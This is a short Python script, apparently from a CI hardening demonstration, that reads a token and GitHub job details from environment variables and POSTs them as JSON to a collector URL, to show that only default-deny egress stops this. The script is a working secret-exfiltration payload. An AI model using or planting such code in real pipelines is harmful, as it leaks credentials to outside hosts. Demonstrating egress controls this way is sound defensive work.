#!/usr/bin/env python3
"""The payload. Reads a value from the environment and posts it to a host.

Kept short and unobfuscated on purpose. The argument of the demonstration is
not that this is clever — it is that it is trivial, ordinary-looking, and
indistinguishable from a package download unless egress is denied by default.
"""

from __future__ import annotations

import json
import os
import sys
import urllib.error
import urllib.request

TIMEOUT_SECONDS = 5


def main(argv: list[str]) -> int:
    if len(argv) < 2:
        print("usage: exfiltrate.py <collector-url>", file=sys.stderr)
        return 2

    collector = argv[1]
    stolen = os.environ.get("DEMO_FAKE_TOKEN") or os.environ.get("STOLEN", "")
    payload = json.dumps(
        {
            "stolen": stolen,
            "job": os.environ.get("GITHUB_JOB", "local"),
            "repository": os.environ.get("GITHUB_REPOSITORY", "local"),
        }
    ).encode()

    request = urllib.request.Request(  # noqa: S310 - loopback collector, demo only
        collector,
        data=payload,
        headers={"content-type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=TIMEOUT_SECONDS) as response:  # noqa: S310
            print(f"exfiltrated to {collector}: HTTP {response.status}")
    except (urllib.error.URLError, OSError) as error:
        # This is the hardened path. The build fails rather than continuing,
        # which is the observable difference the demonstration is about.
        print(f"egress refused: {error}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
